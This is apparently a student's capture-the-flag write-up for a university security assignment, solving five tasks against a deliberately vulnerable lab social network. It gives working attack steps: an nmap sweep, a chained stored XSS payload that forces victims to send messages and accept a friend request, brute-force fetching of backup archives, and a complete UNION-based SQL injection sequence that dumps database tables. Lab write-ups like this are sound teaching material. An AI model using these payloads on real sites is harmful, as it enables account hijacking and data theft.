Tema 2 ISC - Dumitrache Adrian-George [334CC]

la multi ani

Task 1 - Initial access

Flag: SpeishFlag{H8vNoNx49OUUTAFQSfYVRJHvS3I78oYN}

There's not much info in the assignment text, so I tried seeing if there are
any ports open on the dev-machine or on the assignment website to no avail.
What ended up working was taking some inspiration from the networking lab and
port scanning the entire network of the dev machine, like this:
nmap 192.168.176.4/20

Which reveals a couple IP's with open ports, one of which, when given to the
tunnel script, gives us access to the website. Unfortunately, it doesn't have
a registration page accessible from the user interface, we need a link.

Note: the IP address changes when restarting, so here's a crazy one liner
that grabs the IP and starts the tunnel too (but takes forever if the random
mask ends up being /16):
./webtunnel.sh "$(nmap "$(ip a sh | grep inet | tail -n 1 | awk  '{print $2}')" | grep "Nmap scan report for" |tail -n 2 | head -n 1 | awk '{print $5}')" 80

I tried directory enumeration on the website, but it didn't reveal anything
except the fact that some PHP functions like dispatch and render seem to be
exposed, we can try using them correctly, like:
http://localhost:8080/render?url=https://www.google.com

but nothing happens. Using them incorrectly leads to PHP errors which I can't
understand because PHP in 2023 lol.

As usual, keep it simple stupid, the link to the real registration page was in
an HTML comment on the fake registration page and is at:
/auth/register_real_one

We'll make an account with the following credentials:

fn: Dumitrache Adrian-George
cn: Dumitrrrracken Adddrian-Jorge
pw: tragemtare

And now we're in! There's a couple users, posts and even a friend request, but
the flag doesn't seem to be visible anywhere. It ended up being hidden in the
HTML code of the main page in an invisible div which I found by CTRL+F-ing in
the source code for "Speish", whatever that means. There ya go.

Task 2 - XSS attack

Flag: SpeishFlag{MqX8MzqbVTeXXpqjecZUZUrNSVNumKhT}

The hints are pretty helpful here, too bad I didn't read them at first.

You can easily find your user ID by making another account and friending
yourself, the ID will then be visible on the messages page on some of the
links. It will be 9 on the first account you make.

I tried adding everyone, but they didn't accept :(, then I took "social
engineering" a bit too literally and started posting links to the forum (like
/inside/friends/accept?id=9) hoping that maybe the users are going to click
them (lol).

Then I actually learned what an XXS attack is and tried posting this in various
places:
<script>alert("Furaciune");</script>

The forum posts seem to be safeguarded from this, but thanks to the hints, I
figured out that the message functionality is actually the one that is
vulnerable.

There's only one person we can message: Kat Nyan, who prematurely added us as a
friend. The hints point at the fact we need a common friend with the boss, so
maybe he's our guy (there's no other cats who accept our friend requests
anyway).

Looking at the HTML code for the message form, it seems that it make a POST
request at "/inside/message/send/<user-id>" to send the messages. Reading some
documentation about forms reveals how to send similar POST requests. After a
lot of trial and error, here's how to force Kat Nyan to send a message to you:
<script>
fetch('/inside/message/send/9', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'message=ur_so_cool_man' });
</script>

Basically we're injecting a script that will send a post request which results
in a message being sent to us on behalf on Kat Nyan.

How does this help us? Well it means we can message users on behalf on Kat Nyan
just by changing the ID. The Boss' ID is 1, but sending regular messages to
him doesn't seem to do anything. So we need to force him to accept us.

Experimentation led to injecting this:
<script>
fetch('/inside/message/send/1', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body:  'message=<script src=http://localhost:8080/js/main.js?v1></scr' + 'ipt>' + '<script>acceptFriend(9);</scr' + 'ipt>' });
</script>

This script does a sort of double XSS attack, first Kat Nyan is tricked into
executing code that sends a message to The Boss, then the boss is also tricked
into executing the script received from Kat Nyan, which calls a function that
accepts our friend request. The message is a bit complicated so let's break it
down:

'<script src=http://localhost:8080/js/main.js?v1></scr' + 'ipt>':
- this loads the file where the function we need is located, this is necessary
because otherwise the next script tag would be executed before main.js loads
- the weird script end tag is because if we wrote it normally (as in "</script>")
it would close the script we're using to send messages from Kat Nyan
prematurely, this is just a workaround
'<script>acceptFriend(9);</scr' + 'ipt>'
- after loading the file we need, we can just call this function to accept our
own friend request

Now that we're besties, the flag is found on The Boss' profile page.

Task 3 - Source code

Flag: SpeishFlag{gTF91UjjtQS1f5WOsTldZyfZO7FXgulM}

Looking at the profile page of The Boss, there is a post that indicates the
fact that a 'backup.sh' script exists. Monkey see, monkey do, accessing
http://localhost:8080/backup.sh downloads the script, great.

Analyzing the script reveals that it just archives the current folder, archives
the flag and concatenates them into one file that has a filename of the
following format:
backup-$DATE.tar.gz (didn't even prevent world splitting by double quoting smh)
where $DATE is generated through this command:
date +'%Y-%m-%d' -d "$(( RANDOM % 15 + 2 )) days ago"

Meaning that it's a date from 2 to 16 days before the script was last run.
Thankfully, we haven't had computers for that long so we can ooga booga with
this one liner:
for i in {1..2000}; do wget localhost:8080/backup-"$(date +'%Y-%m-%d' -d "$i days ago")".tar.gz;done

which will eventually download the archive.

Now we need to somehow split the first archive from the second, a classic steg
problem trivialized by binwalk:
binwalk -D='.*' backup-2023-12-21.tar.gz

This will extract the 2 archives, extracting them reveals the source code of
the website, the flag and tom si jerry pe manele incercati noul salam :)))))

Task 4 - SQL Trickery

Flag: SpeishFlag{lKhkNWBd2MuegfS2pA5p60El7zAF5zxV}

I tried testing multiple fields by simply inputting ' and ", the only one
that ended up working was "http://localhost:8080/inside/p/<name>", if we put
an ' in the name field we get an error. Great, we'll use this as our vector of
attack (this is what browsing cybersec sites does to you, you start talking
like this).

SQL injection cheatsheet incoming:

We can determine how many columns we have using the following code:
' ORDER BY 1,2,... -- cap si pajura

We'll add a number until we get an error, which happens at 9, so we have 8
columns. We now need to find the columns that are being shown on the page, try
this on for size:
' UNION SELECT 1,2,3,4,5,6,7,8 FROM INFORMATION_SCHEMA.TABLES -- noi suntem banul si stema

The third and sixth columns seem to pop up on the profile page (maybe other's
too, but I don't see them. Let's play with the third column first:

Let's see what schemas we have:
'UNION SELECT 1,2,GROUP_CONCAT(TABLE_SCHEMA SEPARATOR ' '),4,5,6,7,8 FROM INFORMATION_SCHEMA.TABLES -- cati au incercat

This shows a lot of duplicates, we can use DISTINCT to show only uniques:
'UNION SELECT 1,2,GROUP_CONCAT(DISTINCT(TABLE_SCHEMA) SEPARATOR ' '),4,5,6,7,8 FROM INFORMATION_SCHEMA.TABLES -- nu ne-au daramat emblema

We see an interesting schema this way: web_4246

And we can check out the tables inside it:
'UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME SEPARATOR ' '),4,5,6,7,8 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='web_4246' -- ca numele nostru

Boring, there's a table that's literally called flags89627, let's check out its columns:
'UNION SELECT 1,2,GROUP_CONCAT(COLUMN_NAME SEPARATOR ' '),4,5,6,7,8 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='web_4246' AND TABLE_NAME='flags89627' -- are greutate

Even worse, there's a column called zaflag, let's see it:
' UNION SELECT 1,2,zaflag,4,5,6,7,8 FROM web_4246.flags89627 -- si mereu in viata am fost frate pentru frate

This reveals our flag.

Task 5 - Network analysis

Flag: SpeishFlag{VMql8p0OJmlijYAXXpz6TbfAOpv0JX40}

All you have to do here is open up tcpdump and see what traffic the station is
receiving. It's mostly repeating some ARP request from the assignment generator
website and a UDP packet to port 10696 which results in an unreachable message
since no program on the machine is listening on that port.

If we open a nc server like this:
nc -ul 10696

and wait for a bit, we'll end up receving this message:
NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.U3BlaXNoRmxhZ3tWTXFsOHAwT0ptbGlqWUFYWHB6NlRiZkFPcHYwSlg0MH0=NYAN.NYAN.NYAN.NYAN.NYAN.NYAN.NYAN

Between the NYAN's (did you know that there are nyan cat NFT's now?) there's a
base64 encoded string that decodes to our flag:
echo "U3BlaXNoRmxhZ3tWTXFsOHAwT0ptbGlqWUFYWHB6NlRiZkFPcHYwSlg0MH0=" | base64 -d

Done!
